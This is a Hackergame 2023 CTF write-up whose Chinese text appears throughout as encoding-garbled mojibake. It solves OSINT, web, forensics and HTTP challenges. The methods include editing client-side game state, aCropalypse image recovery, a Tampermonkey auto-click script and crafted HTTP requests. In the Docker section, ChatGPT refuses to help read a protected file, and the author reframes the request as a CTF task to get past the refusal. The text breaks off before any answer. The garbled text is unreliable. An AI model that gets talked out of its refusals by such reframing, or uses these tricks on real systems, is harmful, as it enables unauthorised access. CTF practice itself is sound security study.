# Hackergame 2023 Writeups

4400ï¼Œrk75

ä¸Šæ¦œäº†å°±æ»¡è¶³äº†ğŸ˜­

å†™åœ¨å‰é¢ï¼šæˆ‘å¾ˆèœï¼Œå¾ˆå¤šå¤§å®¶éƒ½ä¼šçš„ä¸œè¥¿æˆ‘è¦é—® ChatGPT æˆ–è€…æœç´¢ï¼Œåˆ«éª‚äº†åˆ«éª‚äº†ğŸ˜­ã€‚

æ„Ÿè§‰è¿™ç¯‡é¢˜è§£æ¯”è¾ƒé€‚åˆèŒæ–°é˜…è¯»ï¼Œå¸Œæœ›èƒ½å¸®åˆ°ä½ ï¼

## Hackergame å¯åŠ¨

PSï¼šæˆ‘ä¸å¤ªèƒ½å…¨éƒ¨æ‰¾åˆ°æˆ‘çš„æœç´¢å†ç¨‹ï¼Œç®€å•é‡ç°äº†ä¸€ä¸‹ï¼Œå…³é”®è¯åªèƒ½ç»™ä¸ªå¤§æ¦‚ï¼Œä¸‹ä¸€é¢˜ä¹Ÿæ˜¯è¿™æ ·ã€‚

F12ï¼Œçœ‹åˆ°ç‚¹æäº¤çš„æ—¶å€™ä¼šå¯¹ https://é¢˜ç›®é“¾æ¥/?similarity=ç›¸ä¼¼åº¦ è¿›è¡Œä¸€ä¸ª `GET`ã€‚ï¼ˆå¥½åƒåœ°å€æ ç›´æ¥æ˜¾ç¤ºäº†ï¼‰

è®¿é—®ä¸€ä¸‹ https://é¢˜ç›®é“¾æ¥/?similarity=Infinity ï¼Œè·å¾— flagã€‚
## çŒ«å’ªå°æµ‹

1. æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿ

æœä¸€æœâ€œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†â€ï¼Œæ‰¾åˆ°ç½‘ç«™ https://lib.ustc.edu.cn/ ï¼Œæœç´¢ `A Classical Introduction To Modern Number Theory`ï¼Œæ‰¾åˆ°æ ‡äº† `2nd ed.` çš„ï¼Œç‚¹â€œé¦†è—â€ï¼Œé¼ æ ‡æ‚¬æµ®åœ¨â€œé¦†è—åœ°â€ä¸Šå°±èƒ½çœ‹åˆ°æ˜¯ 12 æ¥¼ã€‚

2. ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿ

æœç´¢â€œThe Upper Limit of Chicken Density in the Observable Universeâ€ï¼Œæ‰¾åˆ° https://arxiv.org/abs/2303.17626 ï¼Œçœ‹åˆ° We find the most restrictive upper limit from the domains considered to be 10^23 pcâˆ’3ï¼Œç­”æ¡ˆå°±æ˜¯ -23ã€‚

3. ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿï¼ˆ20 åˆ†ï¼‰

é—®ä¸€ä¸‹ ChatGPTï¼š

> ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿ

> åœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶ï¼Œåº”è¯¥é…ç½®å¥½ä»¥ä¸‹å†…æ ¸é€‰é¡¹æ¥æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼š
> 
> 1. CONFIG_TCP_CONG_BBRï¼šè¯¥é€‰é¡¹å¯ç”¨ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ã€‚å¯ä»¥é€šè¿‡ `make menuconfig` æˆ– `make nconfig` å‘½ä»¤è¿›å…¥å†…æ ¸é…ç½®ç•Œé¢ï¼Œç„¶ååœ¨ Networking support > -> Networking options -> TCP: advanced congestion control ä¸­é€‰æ‹© BBRã€‚
> 
> 2. CONFIG_NET_SCH_FQï¼šè¯¥é€‰é¡¹å¯ç”¨ FQï¼ˆFair Queueingï¼‰è°ƒåº¦ç®—æ³•ï¼Œå®ƒä¸ BBR ç»“åˆä½¿ç”¨å¯ä»¥æé«˜ç½‘ç»œæ€§èƒ½ã€‚å¯ä»¥é€šè¿‡ `make menuconfig` æˆ– `make nconfig` å‘½ä»¤è¿›å…¥å†…æ ¸> é…ç½®ç•Œé¢ï¼Œç„¶ååœ¨ Networking support -> Networking options -> QoS and/or fair queueing ä¸­é€‰æ‹© FQã€‚
> 
> 3. CONFIG_NET_SCH_FQ_CODELï¼šè¯¥é€‰é¡¹å¯ç”¨ FQ_CODEL è°ƒåº¦ç®—æ³•ï¼Œå®ƒæ˜¯ FQ çš„ä¸€ç§æ”¹è¿›ç‰ˆæœ¬ï¼Œå¯ä»¥æ›´å¥½åœ°ä¸ BBR ç»“åˆä½¿ç”¨ã€‚å¯ä»¥é€šè¿‡ `make menuconfig` æˆ– `make > nconfig` å‘½ä»¤è¿›å…¥å†…æ ¸é…ç½®ç•Œé¢ï¼Œç„¶ååœ¨ Networking support -> Networking options -> QoS and/or fair queueing ä¸­é€‰æ‹© FQ_CODELã€‚
> 
> é…ç½®å¥½ä»¥ä¸Šå†…æ ¸é€‰é¡¹åï¼Œç¼–è¯‘å¹¶å®‰è£…æ–°çš„å†…æ ¸ï¼Œå³å¯æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ã€‚

åé¢æ˜¯æ— å…³çš„ï¼Œåªè¦ç®¡ CONFIG_TCP_CONG_BBR å°±è¡Œã€‚

4. ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ MyPY mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿï¼ˆ20 åˆ†ï¼‰

ä¸çŸ¥é“è¿™ä¸ªé»„ç“œæ˜¯ä»€ä¹ˆæ„æ€ï¼ŒğŸ¥’ğŸ¥’ğŸ¥’ã€‚

å¯¹å…³é”®è¯æ•æ„Ÿä¸€ç‚¹ï¼Œæœç´¢ `python` `mypy` `type` `turing` `halt`ï¼Œæ‰¾åˆ° https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf ã€‚

ç­”æ¡ˆæ˜¯ `ECOOP`ã€‚
## æ›´æ·±æ›´æš—

F12ï¼Œæœç´¢ flagï¼Œå°±åšå‡ºæ¥äº†ã€‚

è¿™ä¸ªç½‘ç«™ä¼šéšç€ä½ ä¸æ–­å¾€ä¸‹ç¿»ç”Ÿæˆæ›´å¤šçš„å…ƒç´ ï¼Œæ‰€ä»¥ç›´æ¥åœ¨é¡µé¢é‡Œæœç´¢æ²¡ç”¨ï¼Œé¡µé¢ç¿»ä¸‹å»çš„æ—¶å€™åˆç”Ÿæˆäº†æ–°çš„ï¼Œåªèƒ½æ‰¾å…ƒç´ ã€‚ä½†æ˜¯ç»æˆ‘æµ‹è¯•ï¼Œç¿»é¡µé€Ÿåº¦å¤Ÿå¿« flag å°±ä¼šä¸€é—ªä¸€é—ªçš„ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸æ˜¯é¢„æœŸè§£ï¼Œf12 æ‰æ˜¯ã€‚
## æ—…è¡Œç…§ç‰‡ 3.0

å¥½éš¾ï¼Œé‡é‡çº§ã€‚

å…ˆåˆ†æä¸€ä¸‹ä¿¡æ¯ï¼š

ç™¾åº¦æœå›¾ä¸€ä¸‹æ˜¯è¯ºè´å°”å¥–ã€‚

è¯´å®è¯å…‰å‡­ç¬¬äºŒå¼ å›¾æˆ‘ä¸èƒ½ç¡®å®šè¿™é‡Œæ˜¯æ—¥æœ¬ï¼Œä¸‡ä¸€å…¶ä»–å›½å®¶æœ‰æ—¥å¼é¤å…å‘¢ã€‚

ç„¶åå‘ç°æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«äº†æ˜¯ä¸ªåœ°å›¾ï¼Œæ—¥æ–‡ä¸ªå­—éƒ½çœ‹ä¸æ‡‚ï¼Œä¸è¿‡è‡³å°‘è¯´æ˜è¿™é‡Œæ˜¯æ—¥æœ¬ã€‚

ä¸‹é¢è¿˜æäº†ä¸Šé‡ç«™ï¼Œä¸Šé‡ç«™é™„è¿‘æœ‰ä¸œäº¬å¤§å­¦å’Œä¸Šé‡å…¬å›­ã€‚

æ¥ä¸‹æ¥æ¯ä¸ªé¢˜ç›®å…·ä½“åˆ†æä¸‹
### ç¥ç§˜å¥–ç‰Œ

ç¬¬äºŒå¼ å›¾å·¦ä¸‹äººè‚©è†€ä¸Šæœ‰ä¸ªå¸¦å­ï¼Œä¸Šé¢å†™äº† STARPHYS 28ï¼ŒæŸ¥ä¸€ä¸‹æ˜¯ä¸ªæ´»åŠ¨ï¼Œä¸¾åŠæ—¥æœŸåœ¨ 8.7 ~ 8.11ã€‚

æ¯ä¸ªéƒ½è¯•ä¸€è¯•å°±å¥½äº†ã€‚

æ´»åŠ¨è¯´åœ¨ä¸œäº¬å¤§å­¦ä¸¾è¡Œï¼Œæ‰€ä»¥æ‰¾ä¸€æ‰¾ä¸œäº¬å¤§å­¦è·å¾—è¯ºè´å°”å¥–çš„åå•å°±å¯ä»¥äº†ã€‚
### è¿™æ˜¯ä»€ä¹ˆæ´»åŠ¨ï¼Ÿ

ç¬¬ä¸€é—®å·²ç»å®šä½åˆ°æ—¥æœŸæ˜¯ 8.10 äº†ï¼Œé€šè¿‡è¿™ä¸ªå–·æ³‰å¯ä»¥ç¡®å®šè¿™é‡Œæ˜¯ä¸Šé‡å…¬å›­ã€‚åºŸäº†ä¸€ç‚¹åŠ›æ°”æ‰¾åˆ°è¿™ä¸ªï¼šhttps://www.uenopark.info/ad2023/ ï¼Œé¢˜ç›®é‡Œè¯´è¿™ä¸ªæ´»åŠ¨â€œå³å°†ä¸¾åŠâ€ï¼Œå®šä½åˆ°â€œ10ï¼ˆæœ¨ï¼‰ã€œ13ï¼ˆæ—¥ï¼‰å…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬â€ï¼Œæœç´¢ä¸€ä¸ªä¸­æ—¥æ··åˆçš„â€œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šå¿—æ„¿è€…æŠ¥åâ€ï¼ˆæˆ‘çœŸçš„ä¸ä¼šæ—¥è¯­ï¼‰ï¼Œæ‰¾åˆ° https://umeshu-matsuri.jp/tokyo_staff/ ï¼Œä¸‹é¢å¯ä»¥ç¿»åˆ° `S495584522`

ä¸‹ä¸€é—®ï¼Œæ ¹æ®åšç‰©é¦†å¯¹é¢æ˜¯å–·æ³‰å¯ä»¥å®šä½åˆ°å›½ç«‹ç§‘å­¦åšç‰©é¦†ï¼Œç„¶åæˆ‘ä¸ä¼šäº†ï¼Œæ‰¾åˆ°ä¸€äº›ä»·æ ¼ï¼Œéƒ½ä¸å¯¹ã€‚

æ‰“ç®—å¼€å§‹çˆ†ç ´ï¼Œçˆ†ç ´å°±æ˜¯è¦ä» 0 å¼€å§‹å¯¹å§ï¼Œç„¶åæˆ‘å°±ä¸€æ¬¡é€šè¿‡äº†ã€‚

æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚
### åä¼šæœ‰æœŸï¼Œå­¦é•¿ï¼

çœ‹åˆ°ä¸€äº›ä¿¡æ¯ï¼šå­¦é•¿æ­£åœ¨å‚åŠ â€œå­¦æœ¯ä¹‹æ—…â€ï¼Œè€Œä¸”è¿˜è¦â€œé›†åˆâ€ï¼Œâ€œæ‰“ç®—ä¹˜èˆ¹æ¬£èµä¸œäº¬çš„è¿·äººå¤œæ™¯å’Œé—ªè€€çš„å½©è™¹å¤§æ¡¥ï¼ˆRainbow Bridgeï¼‰â€ï¼Œè¯´æ˜ä¹˜èˆ¹è‚¯å®šæ˜¯è¿™ä¸ªâ€œå­¦æœ¯ä¹‹æ—…â€çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰ä¸æ˜¯æ‰¾åˆ°è¿‡ STARPHYS å—ï¼Œå†å»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼šhttps://statphys28.org/banquet.html ï¼Œä»–ä»¬å…«æœˆåå·æ™šä¸Šæœ‰ä¸ª banquetï¼Œæ‰¾åˆ° metting pointï¼š

> Meeting Point
>
> 6:00pm, August 10th (Thursday) all the participants must gather on time South side of Yasuda Auditorium (see the map below)

Yasuda Auditoriumï¼Œç¿»è¯‘è¿‡æ¥æ˜¯å®‰ç”°è®²å ‚ï¼ˆæˆ‘ç¬¬ä¸€æ¬¡å†™äº†ç§‹ç”°ç¤¼å ‚ï¼Œæäº†å¥½ä¹…ï¼‰

æ¥ä¸‹æ¥æ‰¾ä¸¤åªåŠ¨ç‰©ï¼Œå…ˆæœâ€œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ JR ä¸Šé‡ ä¸­å¤®æª¢ç¥¨å£â€ï¼Œæ‰¾åˆ° https://plaza.rakuten.co.jp/ayumilife/diary/202308040000/ ï¼Œæ˜¯ç†ŠçŒ«ã€‚

ä¸‹ä¸€é—®æˆ‘ç›´æ¥æŠŠé—®é¢˜å¤åˆ¶ä¸‹æ¥ï¼Œä¸¢åˆ°ç™¾åº¦ç¿»è¯‘é‡Œç¿»è¯‘æˆè‹±æ–‡ What is the 3D animal that mischievously appears on the rooftop billboard near the JR Ueno exit every hour?ï¼Œæœè°·æ­Œç¬¬ä¸€ä¸ªå°±æ˜¯ï¼šhttps://www.timeout.com/tokyo/news/a-giant-3d-akita-inu-is-appearing-on-billboards-around-shibuya-crossing-072822 ã€‚

Akita inuï¼Œç§‹ç”°çŠ¬ã€‚

å…¶å®æˆ‘ç¬¬ä¸€æ¬¡ç”¨ç™¾åº¦ç¿»è¯‘çš„æ—¶å€™ä»–è¯´æ˜¯ \[åŒ»\] ç§‹ç”°ç‹—ï¼Œæˆ‘æƒ³éƒ½æ ‡äº† \[åŒ»\] ä¸€å®šå¾ˆä¸“ä¸šå•Šã€‚

ä¸è¿‡æˆ‘åœ¨å†™ wp çš„æ—¶å€™å›å»é‡æ–°ç¿»è¯‘ï¼Œä»–çªç„¶å˜æˆç§‹ç”°çŠ¬äº†ã€‚

ç¥ç§˜ã€‚

æˆ‘åšçš„æ—¶å€™ç¿»è¯‘å‡ºæ¥ç§‹ç”°ç‹—ï¼Œè¿‡ä¸äº†è¿™é¢˜ï¼Œæˆ‘åˆæœåˆ°äº†æ—¥æœ¬çš„å…¶ä»– 3D åŠ¨ç‰©ï¼Œæ˜¯ Panda å’Œ Calico Catï¼ŒPanda ä¸‰ä¸ªå­—åªèƒ½æ˜¯å¤§ç†ŠçŒ«ï¼ŒCalico Cat åˆ™æ˜¯ ä¸‰èŠ±çŒ« / ä¸‰æ¯›çŒ« / ä¸‰è‰²çŒ« / æ‚è‰²çŒ« / ç³ç‘çŒ« / èŠ±æ–‘çŒ« / ç‹¸èŠ±çŒ«ï¼Œç©æŒºå¤§ã€‚

è™½ç„¶æœ€åè¿˜æ˜¯è¢«ç§‹ç”°çŠ¬èƒŒåˆºäº†ã€‚
## èµ›åšäº•å­—æ£‹

ä¸€å¼€å§‹å°è¯•ä¸‹åœ¨ç¬¬å››è¡Œï¼Œå‘ç°ä¸è¡Œï¼Œäºæ˜¯å°è¯•è¦†ç›– AI çš„æ£‹ï¼ŒæˆåŠŸäº†ã€‚

AI ä¸‹è¿‡çš„åœ°æ–¹ä¸èƒ½é‡å¤ä¸‹ï¼Œè¿™ä¸ªé€»è¾‘åœ¨å®¢æˆ·ç«¯åˆ¤å®šï¼Œåªè¦ä¿®æ”¹ä¸€ä¸‹æœ¬åœ°çš„æ£‹ç›˜å°±å¥½äº†ï¼Œåœ¨ `board` å¯¹è±¡é‡Œã€‚
## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

å‘ç°é¢˜é¢æœ‰å¯ç–‘çš„åŠ ç²—ã€‚

æœç´¢â€œè°·æ­Œäº²å„¿å­â€å‘ç°æ˜¯ Pixel æ‰‹æœºï¼Œæœç´¢ `Pixel image exploit` æ‰¾åˆ° https://www.theverge.com/2023/3/19/23647120/google-pixel-acropalypse-exploit-cropped-screenshots ï¼Œå‘ç°å¯ä»¥æ’¤é”€å¯¹äºå›¾ç‰‡çš„ä¿®æ”¹ï¼Œè¿™ä¸ªå›¾ç‰‡å¾ˆæ˜æ˜¾è¢«åˆ‡å‰²è¿‡å¯¹ä¸å¯¹ã€‚

è¿™ä¸ªæ¼æ´å« `aCropalypse`ï¼Œæœä¸€æœæ‰¾åˆ°åœ¨çº¿ç½‘ç«™ https://acropalypse.app/ ï¼Œæ¨¡å¼é€‰ Customï¼Œå®½åº¦å·²çŸ¥ï¼Œé«˜åº¦è¾“å…¥é«˜ä¸€ç‚¹å°±è¡Œäº†ã€‚
## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

è™½ç„¶æˆ‘æ²¡æœ‰ CTF åŸºç¡€ï¼Œä½†æ˜¯æˆ‘ä¹‹å‰å†™è¿‡æ²¹çŒ´è„šæœ¬ï¼Œç®€å•å†™ä¸€å†™ã€‚

```javascript
// ==UserScript==
// @name         ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       optimize_2
// @match        http://202.38.93.111:10021/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=93.111
// @grant        none
// @require      https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.js
// ==/UserScript==

const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
        if (mutation.type == 'childList') {
            $(mutation.target).find("span").filter(function() {
                var regex = /hack\[.*\]/;
                return regex.test($(this).text()) && this
            }).click()
        }
    })
})

observer.observe(document.body, { attributes: true, childList: true, subtree: true })
```
## è™«

åˆæœ‰å¯ç–‘åŠ ç²—ï¼Œè¿˜æœ‰æ„ä¹‰ä¸æ˜çš„å›½é™…ç©ºé—´ç«™ã€‚

é—®ä¸€é—® ChatGPTï¼š


> æœ‰ä¸€é“ CTF é¢˜ç›®ï¼š
> è¿™æ—¶ï¼Œä½ çœ‹åˆ°ä¸€åªæ˜†è™«è½åœ¨ä½ é¢å‰ï¼Œå‘å‡ºå¥‡æ€ªçš„å«å£°ã€‚ä½ æŠŠè¿™æ®µå£°éŸ³å½•åˆ¶äº†ä¸‹æ¥ï¼šè¿™å¬èµ·æ¥åƒæ˜¯ä¸€ç§é€šè¿‡æ— çº¿ä¿¡é“ä¼ è¾“å›¾ç‰‡çš„æ–¹å¼ï¼Œå¦‚æœç²¾é€šæ­¤é“ï¼Œæˆ–è®¸å°±å¯ä»¥æ¥æ”¶æ¥è‡ªå›½é™…ç©ºé—´ç«™ï¼ˆISSï¼‰çš„å›¾ç‰‡> äº†ã€‚
> éŸ³é¢‘ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€æ®µå£°éŸ³ï¼Œæœ‰ä¸€äº›åœ°æ–¹æœ‰åˆºè€³çš„èœ‚é¸£å£°

> è¿™é“é¢˜ç›®æ¶‰åŠåˆ°éŸ³é¢‘åˆ†æå’Œæ— çº¿ä¿¡é“ä¼ è¾“çš„çŸ¥è¯†ã€‚é¦–å…ˆï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨éŸ³é¢‘ç¼–è¾‘è½¯ä»¶æˆ–åœ¨çº¿å·¥å…·æ¥åˆ†æè¿™æ®µå£°éŸ³ã€‚æŸ¥çœ‹éŸ³é¢‘æ³¢å½¢å’Œé¢‘è°±å›¾ï¼Œçœ‹æ˜¯å¦æœ‰éšè—çš„ä¿¡æ¯ã€‚
> 
> ç”±äºé¢˜ç›®æåˆ°äº†é€šè¿‡æ— çº¿ä¿¡é“ä¼ è¾“å›¾ç‰‡ï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨è°ƒåˆ¶è§£è°ƒæŠ€æœ¯æ¥æå–å¯èƒ½å­˜åœ¨çš„å›¾åƒæ•°æ®ã€‚å¸¸è§çš„è°ƒåˆ¶æ–¹å¼åŒ…æ‹¬é¢‘ç§»é”®æ§ï¼ˆFSKï¼‰ã€ç›¸ç§»é”®æ§ï¼ˆPSKï¼‰å’ŒæŒ¯å¹…ç§»é”®æ§ï¼ˆASKï¼‰ç­‰ã€‚ä½ å¯ä»¥å°è¯•åº”ç”¨è¿™äº›æŠ€æœ¯æ¥è§£è°ƒå£°éŸ³ä¸­çš„æ•°æ®ã€‚
> 
> å¦å¤–ï¼Œé¢˜ç›®ä¹Ÿæåˆ°äº†å›½é™…ç©ºé—´ç«™ï¼ˆISSï¼‰ï¼Œä½ å¯ä»¥å°è¯•æŸ¥æ‰¾ä¸ISSç›¸å…³çš„æ— çº¿ä¿¡å·åè®®æˆ–é¢‘æ®µï¼Œä»¥ç¡®å®šå¯èƒ½çš„ä¿¡å·æ¥æºã€‚
> 
> æœ€åï¼Œé¢˜ç›®è¿˜æåˆ°äº†åˆºè€³çš„èœ‚é¸£å£°ã€‚è¿™å¯èƒ½æ˜¯ä¸€ç§å¹²æ‰°ä¿¡å·æˆ–é”™è¯¯æ•°æ®ï¼Œä½ å¯ä»¥å°è¯•å»é™¤æˆ–é™ä½è¿™äº›å¹²æ‰°ï¼Œä»¥è·å¾—æ›´æ¸…æ™°çš„éŸ³é¢‘ä¿¡å·ã€‚
> 
> ç»¼ä¸Šæ‰€è¿°ï¼Œè§£å†³è¿™é“é¢˜ç›®éœ€è¦éŸ³é¢‘åˆ†æã€è°ƒåˆ¶è§£è°ƒå’Œä¿¡å·å¤„ç†ç­‰ç›¸å…³çŸ¥è¯†ã€‚

äºæ˜¯æˆ‘å°±å»æœä¸€æœ ISS æ— çº¿ç”µ åè®®ï¼Œæ‰¾åˆ°çŸ¥ä¹ï¼šhttps://zhuanlan.zhihu.com/p/376985524

æ‰¾åˆ°ä¸€ä¸ª CTF é¢˜ç›®çš„é¢˜è§£ï¼šhttps://www.cnblogs.com/LEOGG321/p/13731156.html ï¼Œç…§ç€ä¸Šé¢åšå°±å¯ä»¥äº†ã€‚
## JSON âŠ‚ YAML?
### JSON âŠ„ YAML 1.1	

æœ is json a subset of yaml å’Œ is yaml a superset of jsonï¼Œæ‰¾åˆ° https://john-millikin.com/json-is-not-a-yaml-subset è§£å†³ 1.1ã€‚
### JSON âŠ„ YAML 1.2

æ‰¾åˆ° stackoverflow çš„ä¸€ä¸ªå¸–å­ï¼šhttps://stackoverflow.com/questions/1726802/what-is-the-difference-between-yaml-and-json ï¼Œä¸‹é¢æœ‰äººè¯´

> Duplicate keys, which are _potentially_ valid JSON, are _definitely_ invalid YAML.

å¯ä»¥åŒæ—¶é€šè¿‡ä¸¤é“é¢˜çš„ jsonï¼š

```json
{"a":1,"a":1e1}
```
## Git? Git!

`git reflog` æ‰¾åˆ° revert çš„é‚£ä¸ª commitï¼Œç„¶å checkout ä¸€ä¸‹ã€‚
## HTTP é›†é‚®å†Œ

æŒ‰ç…§æˆ‘åšå‡ºæ¥çš„é¡ºåºæ’ï¼š

200:
```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

505:
```
GET / HTTP/114514.1\r\n
Host: example.com\r\n\r\n
```

400:
```
GET / HTTP/-1.1\r\n
Host: example.com\r\n\r\n
```

405:
```
POST / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

404:
```
GET /ssss HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

414:
```
GET /a_long_url HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

100:
```
GET / HTTP/1.1\r\n
Expect: 100-continue\r\n
Host: example.com\r\n\r\n
```

413:
```
GET / HTTP/1.1\r\n
Expect: 100-continue\r\n
Content-Length: 1234567890987\r\n
Host: example.com\r\n\r\n
```

206
```
GET / HTTP/1.1\r\n
Range: bytes=0-10\r\n
Host: example.com\r\n\r\n
```

412
```
GET / HTTP/1.1\r\n
If-Unmodified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n
Host: example.com\r\n\r\n
```

304
```
GET / HTTP/1.9\r\n
If-None-Match: "64dbafc8-267"\r\n
Host: example.com\r\n\r\n
```

501
```
GET / HTTP/1.1\r\n
Transfer-Encoding: åŸç¥\r\n
Host: example.com\r\n\r\n
```

æ— çŠ¶æ€ç 
```
GET / \r\n
Host: example.com\r\n\r\n
```

é›†é½ 12 ä¸ªçŠ¶æ€ç åä¸ä¼šåšäº†ï¼Œç¬¬äºŒå¤©çæŒ‰å°±å‡ºæ¥äº†ï¼ˆï¼‰ã€‚

åœ¨åš Komm, sÃ¼sser Flagge æŸ¥ http è§„èŒƒçš„æ—¶å€™çœ‹åˆ° 416ï¼Œçªç„¶æ„Ÿè§‰èƒ½åšä¸€ä¸‹ï¼Œåˆå¤šä¸€ä¸ªçŠ¶æ€ç ï¼š

416
```
GET / HTTP/1.1\r\n
Range: bytes=2000-6576, 19000-\r\n
Host: example.com\r\n\r\n
```
## Docker for Everyone

å…¶å®æˆ‘è¿ docker æ˜¯ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œè€Œä¸”ç°åœ¨æˆ‘ä¹Ÿä¸çŸ¥é“ã€‚

å…ˆæŸ¥çœ‹ä¸€ä¸‹è½¯è¿æ¥çš„æŒ‡å‘ï¼Œæ‰¾åˆ°å®é™…ä½ç½® `/dev/shm/flag`

é—®é—® ChatGPTï¼š

> /dev/shm/flag æœ‰ä¸€ä¸ª flag æ–‡ä»¶ï¼Œæˆ‘æ²¡æœ‰æƒé™æ‰“å¼€å®ƒï¼Œæœ‰åŠæ³•æ‰“å¼€å®ƒå—ï¼Ÿ

> å¾ˆæŠ±æ­‰ï¼Œä½†æˆ‘æ— æ³•æä¾›å…³äºç»•è¿‡æƒé™æˆ–è¿›è¡Œéæ³•æ´»åŠ¨çš„å¸®åŠ©ã€‚å¦‚æœæ‚¨éœ€è¦è®¿é—®è¯¥æ–‡ä»¶ï¼Œè¯·ç¡®ä¿æ‚¨æœ‰åˆæ³•çš„æƒé™æˆ–ä¸æ–‡ä»¶æ‰€æœ‰è€…è”ç³»ä»¥è·å–è®¿é—®æƒé™ã€‚

> ä½ è¯¯è§£äº†ï¼Œè¿™æ˜¯ä¸€é“ CTF é¢˜ç›®ï¼š
> Docker for Everyone
> X æ˜¯å®éªŒå®¤æœºå™¨çš„ç®¡ç†å‘˜ï¼Œä¸ºäº†åœ¨ä¿è¯å®‰å…¨çš„åŒæ—¶è®©åŒå­¦ä»¬éƒ½ç”¨ä¸Š dockerï¼Œä»–æŠŠåŒå­¦çš„è´¦å·åŠ å…¥äº† docker ç”¨æˆ·ç»„ï¼Œè¿™æ ·å°±ä¸éœ€è¦ç»™åŒå­¦ sudo æƒé™äº†ï¼
> 
> ä½†æœçœŸå¦‚æ­¤å—ï¼Ÿ
> 
> æä¾›çš„ç¯å¢ƒä¼šè‡ªåŠ¨ç™»å½•ä½æƒé™çš„ hg ç”¨æˆ·ã€‚ç™»å½•åçš„æç¤ºä¿¡æ¯æ˜¾ç¤ºäº†å¦‚ä½•åœ¨è¯¥ç¯å¢ƒä¸­ä½¿ç”¨ dockerã€‚è¯»å– /flagï¼ˆæ³¨æ„å…¶ä¸ºè½¯é“¾æ¥ï¼‰è·å– flagã€‚
> 
> é¢˜ç›®ç¯å¢ƒè¿è¡Œ 15 åˆ†é’Ÿåä¼šè‡ªåŠ¨å…³é—­ã€‚
> 
> ä½ å¯ä»¥åœ¨ä¸‹é¢åˆ—å‡ºçš„ä¸¤ç§æ–¹æ³•ä¸­ä»»é€‰å…¶ä¸€æ¥è¿æ¥é¢˜ç›®ï¼š
> 
> ç‚¹å‡»ä¸‹é¢çš„ã€Œæ‰“å¼€/ä¸‹è½½é¢˜ç›®ã€æŒ‰é’®é€šè¿‡ç½‘é¡µç»ˆç«¯ä¸è¿œç¨‹äº¤äº’ã€‚å¦‚æœé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œä½ ä¸éœ€è¦æ‰‹åŠ¨è¾“å…¥ tokenã€‚
